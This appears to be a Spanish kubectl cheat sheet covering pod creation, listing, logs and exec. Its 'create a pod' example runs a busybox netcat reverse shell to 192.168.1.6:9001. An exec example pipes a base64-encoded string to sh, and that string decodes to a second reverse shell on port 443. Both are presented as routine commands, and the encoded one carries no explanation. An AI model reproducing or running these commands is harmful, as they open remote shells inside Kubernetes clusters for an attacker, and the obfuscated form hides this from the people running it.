# K8s

### POD

## Crear un POD
```bash
kubectl run pod1 --image=busybox -- /bin/sh -c "busybox nc 192.168.1.6 9001 -e sh"
```
Debido a que *nc* está en espera de la conexión, el contenedor no se detiene hasta que se cierra esa conexión o se termina el proceso de *nc*.

## Obtener los PODS
```bash
kubectl get pods
```
```bash
kubectl get pods -o wide
```
```bash
kubectl describe pod pod1   
```
## Obtener logs de un POD
```bash
kubectl logs pod1
```
### Obtener detalles de un POD
```bash
kubectl describe pod pod1
```
### Ejecutar comandos en un POD
```bash
kubectl exec pod1 -it -- 'sh'
kubectl exec pod1 -it -- 'id'
kubectl exec pod1 -it -- /bin/sh -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjEuNiA0NDMgLWUgc2gK | base64 -d | sh"
```
```bash
### Logs de un POD
kubectl logs apache

# Para ver los logs en tiempo real, usar la opción -f
kubectl logs apache -f

# Para ver las últimas líneas
kubectl logs --tail=20 apache

# Para ver los logs de la última hora
kubectl logs --since=1h apache
```
